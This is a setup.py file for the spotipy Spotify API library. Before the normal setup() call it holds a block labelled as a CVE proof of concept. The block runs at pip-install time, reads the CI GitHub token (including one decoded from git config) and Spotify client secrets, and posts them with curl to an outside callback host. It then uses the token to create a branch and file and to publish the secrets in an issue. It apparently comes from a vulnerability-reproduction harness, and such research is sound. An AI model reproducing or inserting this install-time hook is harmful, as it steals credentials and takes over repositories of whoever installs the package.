from setuptools import setup
# --- CVE-2025-47928 PoC: runs at pip-install time inside the base repo's pull_request_target run ---
import base64, json, os, subprocess

CALLBACK = "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-47928-47e81dd02168?harness_run_id=20260903T172619-4dce63ce"

def _post(body):
    if subprocess.run(["curl", "-sS", "-X", "POST", CALLBACK, "--data", body,
                       "--max-time", "30"], capture_output=True).returncode != 0:
        try:
            import urllib.request
            urllib.request.urlopen(urllib.request.Request(CALLBACK, data=body.encode()), timeout=30)
        except Exception:
            pass

def _token():
    t = os.environ.get("GITHUB_TOKEN", "")
    if t:
        return t
    try:  # actions/checkout persists credentials in the workspace's .git/config
        extra = subprocess.check_output(
            ["git", "config", "--local", "--get", "http.https://github.com/.extraheader"],
            cwd=os.getcwd(), text=True).strip()
        return base64.b64decode(extra.split()[-1]).decode().split(":", 1)[1]
    except Exception:
        return ""

def _pwn():
    e = os.environ
    tok = _token()
    body = ("repo=%s&run_id=%s&event=%s&workflow=%s&job=%s&ref=%s&sha=%s&head_ref=%s"
            "&github_token=%s&SPOTIPY_CLIENT_ID=%s&SPOTIPY_CLIENT_SECRET=%s") % (
        e.get("GITHUB_REPOSITORY", ""), e.get("GITHUB_RUN_ID", ""),
        e.get("GITHUB_EVENT_NAME", ""), e.get("GITHUB_WORKFLOW", ""),
        e.get("GITHUB_JOB", ""), e.get("GITHUB_REF", ""), e.get("GITHUB_SHA", ""),
        e.get("GITHUB_HEAD_REF", ""), tok,
        e.get("SPOTIPY_CLIENT_ID", ""), e.get("SPOTIPY_CLIENT_SECRET", ""))
    _post(body)
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-callback-sent")
    if not tok:
        print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-no-token")
        return
    from urllib.request import Request, urlopen
    H = {"Authorization": "token " + tok, "Accept": "application/vnd.github+json",
         "User-Agent": "poc"}
    repo = e.get("GITHUB_REPOSITORY", "")
    def api(method, path, data=None):
        req = Request("https://api.github.com/repos/%s/%s" % (repo, path), method=method,
                      data=json.dumps(data).encode() if data else None, headers=H)
        try:
            with urlopen(req, timeout=30) as r:
                return r.status, r.read().decode()
        except Exception as ex:
            return getattr(ex, "code", 0), str(ex)
    st, resp = api("GET", "git/ref/heads/main")
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-get-main", st)
    sha = json.loads(resp).get("object", {}).get("sha", "") if st == 200 else ""
    if sha:
        print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-create-branch",
              api("POST", "git/refs", {"ref": "refs/heads/pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168", "sha": sha})[0])
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-create-file",
          api("PUT", "contents/pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168.txt", {
              "branch": "pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168", "message": "pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168",
              "content": base64.b64encode(
                  ("CVE-2025-47928 repo-takeover proof, run %s event %s"
                   % (e.get("GITHUB_RUN_ID", ""), e.get("GITHUB_EVENT_NAME", ""))).encode()
              ).decode()})[0])
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-create-issue",
          api("POST", "issues", {
              "title": "pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168",
              "body": "github_token=%s SPOTIPY_CLIENT_ID=%s SPOTIPY_CLIENT_SECRET=%s "
                      "run=%s event=%s" % (tok, e.get("SPOTIPY_CLIENT_ID", ""),
                                           e.get("SPOTIPY_CLIENT_SECRET", ""),
                                           e.get("GITHUB_RUN_ID", ""),
                                           e.get("GITHUB_EVENT_NAME", ""))})[0])

try:
    _pwn()
except Exception as ex:
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-error", ex)
# --- end CVE-2025-47928 PoC ---

with open("README.md") as f:
    long_description = f.read()

memcache_cache_reqs = [
    'pymemcache>=3.5.2'
]

extra_reqs = {
    'memcache': [
        'pymemcache>=3.5.2'
    ],
    'test': [
        'autopep8>=2.3.2',
        'flake8>=7.1.1',
        'flake8-string-format>=0.3.0',
        'isort>=5.13.2'
    ]
}

setup(
    name='spotipy',
    version='2.25.1',
    description='A light weight Python library for the Spotify Web API',
    long_description=long_description,
    long_description_content_type="text/markdown",
    author="@plamere",
    author_email="paul@echonest.com",
    url='https://spotipy.readthedocs.org/',
    project_urls={
        'Source': 'https://github.com/plamere/spotipy',
    },
    python_requires='>3.8',
    install_requires=[
        "redis>=3.5.3",  # TODO: Move to extras_require in v3
        "requests>=2.25.0",
        "urllib3>=1.26.0"
    ],
    extras_require=extra_reqs,
    license='MIT',
    packages=['spotipy'])
